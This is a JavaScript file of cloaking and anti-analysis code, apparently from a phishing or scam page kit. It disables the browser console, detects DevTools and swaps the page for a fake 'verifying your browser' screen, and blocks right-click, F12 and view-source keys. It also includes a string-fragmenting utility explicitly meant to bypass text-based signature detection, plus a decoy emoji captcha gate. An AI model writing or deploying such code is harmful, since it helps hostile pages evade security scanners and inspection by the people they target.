(function(w){
'use strict';

// ============ 1. CONSOLE HIJACK ============
(function(){
var noop=function(){};
var methods=['log','warn','info','error','debug','table','trace','group','groupEnd','groupCollapsed'];
methods.forEach(function(m){
try{if(w.console&&w.console[m])w.console[m]=noop;}catch(e){}
});
// Stored for recovery if needed
w.__console=methods.reduce(function(a,m){a[m]=noop;return a;},{});
})();

// ============ 2. DEVTOOLS DETECTION & COUNTERMEASURE ============
(function(){
var devtools=false;
// Technique 1: debugger trap
var debugInterval=setInterval(function(){
var start=new Date();
debugger;
var elapsed=new Date()-start;
if(elapsed>100){devtools=true;clearInterval(debugInterval);}
},1000);

// Technique 2: element offset trick
(function detect(){
var el=new Image();
Object.defineProperty(el,'id',{get:function(){devtools=true;clearInterval(debugInterval);}});
try{w.console.log(el);}catch(e){}
})();

// Technique 3: Firebug detection
if(w.console&&w.console.firebug){devtools=true;clearInterval(debugInterval);}

// If DevTools detected — redirect or blank
setTimeout(function(){
if(devtools){
try{
document.body.innerHTML='<div style="display:flex;align-items:center;justify-content:center;height:100vh;background:#fff;color:#333;font-family:sans-serif;text-align:center;padding:20px"><div><h1>Please wait...</h1><p style="color:#888;margin-top:8px">Verifying your browser, please wait a moment.</p></div></div>';
}catch(e){}
}
},200);
})();

// ============ 3. F12 / RIGHT-CLICK / KEYBOARD BLOCK ============
(function(){
w.addEventListener('contextmenu',function(e){e.preventDefault();return false;});
w.addEventListener('keydown',function(e){
if(e.key==='F12'||e.keyCode===123){e.preventDefault();e.stopPropagation();return false;}
if(e.ctrlKey&&e.shiftKey&&(e.key==='I'||e.key==='i'||e.key==='C'||e.key==='c'||e.key==='J'||e.key==='j')){e.preventDefault();e.stopPropagation();return false;}
if(e.ctrlKey&&(e.key==='u'||e.key==='U'||e.key==='s'||e.key==='S')){e.preventDefault();e.stopPropagation();return false;}
});
})();

// ============ 4. TEXT FRAGMENTATION UTILITY ============
// Breaks signature strings with empty tags to bypass text-based detection
var Frag = {
  break: function(str){
    var chars=str.split('');
    var result='';
    for(var i=0;i<chars.length;i++){
      result+=chars[i];
      if(i>0&&i%3===0&&i<chars.length-1){
        result+='<b class="f'+Math.floor(Math.random()*899999+100000)+'"></b>';
      }
    }
    return result;
  },
  // For non-HTML contexts — insert zero-width characters
  breakText: function(str){
    var zwj=String.fromCharCode(8205);
    var chars=str.split('');
    var result='';
    for(var i=0;i<chars.length;i++){
      result+=chars[i];
      if(i>0&&i%4===0&&i<chars.length-1){
        result+=zwj;
      }
    }
    return result;
  }
};
w.Frag = Frag;

// ============ 5. CAPTCHA GATE ============
// Lightweight emoji challenge — no images, no external deps
var CaptchaGate = {
  // Pool of challenges: {question, answer (index of correct emoji), emojis[]}
  challenges: [
    {q:'Click the 🍎',ans:0,emojis:['🍎','🚀','🌟','🐱','🌈','🎵']},
    {q:'Click the 🌟',ans:2,emojis:['🌈','🎵','🌟','🍎','🚀','🐱']},
    {q:'Click the 🚀',ans:4,emojis:['🐱','🌟','🌈','🎵','🚀','🍎']},
    {q:'Click the 🐱',ans:3,emojis:['🌟','🍎','🚀','🐱','🌈','🎵']},
    {q:'Click the 🎵',ans:5,emojis:['🍎','🐱','🌟','🚀','🎵','🌈']},
    {q:'Click the 🌈',ans:1,emojis:['🚀','🌈','🐱','🍎','🎵','🌟']},
    {q:'Click the 💎',ans:3,emojis:['🌟','🎵','🍎','💎','🐱','🚀']},
    {q:'Click the 🎯',ans:0,emojis:['🎯','🌈','🌟','🐱','🍎','🎵']},
    {q:'Click the 🔥',ans:5,emojis:['🌟','🚀','🌈','🎵','🍎','🔥']},
    {q:'Click the 💡',ans:2,emojis:['🎯','🌟','💡','🚀','🌈','🐱']}
  ],

  show: function(onComplete){
    var chal=this.challenges[Math.floor(Math.random()*this.challenges.length)];
    var overlay=document.createElement('div');
    overlay.id='captchaGate';
    overlay.style.cssText='position:fixed;inset:0;background:rgba(0,0,0,0.85);display:flex;align-items:center;justify-content:center;z-index:99999;font-family:-apple-system,sans-serif;';
    var box=document.createElement('div');
    box.style.cssText='background:#fff;border-radius:16px;padding:32px 24px;text-align:center;max-width:360px;width:90%;box-shadow:0 8px 40px rgba(0,0,0,0.3);';
    var title=document.createElement('div');
    title.style.cssText='font-size:15px;color:#333;font-weight:600;margin-bottom:16px;';
    title.textContent=chal.q;
    box.appendChild(title);
    var grid=document.createElement('div');
    grid.style.cssText='display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-bottom:20px;';
    chal.emojis.forEach(function(emoji,i){
      var btn=document.createElement('button');
      btn.style.cssText='width:64px;height:64px;font-size:28px;border:2px solid #e0e0e0;border-radius:12px;background:#fafafa;cursor:pointer;transition:all .12s;margin:auto;';
      btn.textContent=emoji;
      btn.onclick=function(){
        if(i===chal.ans){
          overlay.remove();
          if(onComplete)onComplete();
        }else{
          btn.style.borderColor='#ff4444';
          btn.style.background='#fff0f0';
          setTimeout(function(){btn.style.borderColor='#e0e0e0';btn.style.background='#fafafa';},300);
        }
      };
      btn.onmouseenter=function(){this.style.borderColor='#999';this.style.background='#f0f0f0';};
      btn.onmouseleave=function(){this.style.borderColor='#e0e0e0';this.style.background='#fafafa';};
      grid.appendChild(btn);
    });
    box.appendChild(grid);
    var hint=document.createElement('div');
    hint.style.cssText='font-size:12px;color:#aaa;';
    hint.textContent='This helps us verify you are human';
    box.appendChild(hint);
    overlay.appendChild(box);
    document.body.appendChild(overlay);
  }
};
w.CaptchaGate = CaptchaGate;

})(window);
